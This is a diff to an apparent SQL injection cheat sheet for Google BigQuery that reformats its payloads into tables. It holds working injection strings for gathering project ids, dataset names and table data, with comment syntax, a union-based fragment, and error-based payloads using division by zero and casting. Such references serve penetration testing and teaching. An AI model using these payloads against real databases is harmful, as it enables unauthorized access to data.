@@ -1,4 +1,6 @@
-# Google BigQuery SQL Injection 
+# Google BigQuery SQL Injection
+
+> Google BigQuery SQL Injection  is a type of security vulnerability where an attacker can execute arbitrary SQL queries on a Google BigQuery database by manipulating user inputs that are incorporated into SQL queries without proper sanitization. This can lead to unauthorized data access, data manipulation, or other malicious activities.
 
 ## Summary
 
@@ -15,23 +17,18 @@
 * Use a classic single quote to trigger an error: `'`
 * Identify BigQuery using backtick notation: ```SELECT .... FROM `` AS ...```
 
-```ps1
-# Gathering project id
-select @@project_id
-
-# Gathering all dataset names
-select schema_name from INFORMATION_SCHEMA.SCHEMATA
-
-# Gathering data from specific project id & dataset
-select * from `project_id.dataset_name.table_name`
-```
+| SQL Query                                             | Description |
+| ----------------------------------------------------- | -------------------- |
+| `SELECT @@project_id`                                 | Gathering project id |
+| `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA` | Gathering all dataset names |
+| `select * from project_id.dataset_name.table_name`    | Gathering data from specific project id & dataset |
 
 ## BigQuery Comment
 
-```ps1
-select 1#from here it is not working
-select 1/*between those it is not working*/
-```
+| Type                       | Description                       |
+|----------------------------|-----------------------------------|
+| `#`                        | Hash comment                      |
+| `/* PostgreSQL Comment */` | C-style comment                   |
 
 ## BigQuery Union Based
 
@@ -44,13 +41,10 @@ true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,
 
 ## BigQuery Error Based
 
-```ps1
-# Error based - division by zero
-' OR if(1/(length((select('a')))-1)=1,true,false) OR '
-
-# Error based - casting: select CAST(@@project_id AS INT64)
-dataset_name.column_name` union all select CAST(@@project_id AS INT64) ORDER BY 1 DESC#
-```
+| SQL Query                                                | Description          |
+| -------------------------------------------------------- | -------------------- |
+| `' OR if(1/(length((select('a')))-1)=1,true,false) OR '` | Division by zero     |
+| `select CAST(@@project_id AS INT64)`                     | Casting              |
 
 ## BigQuery Boolean Based
 
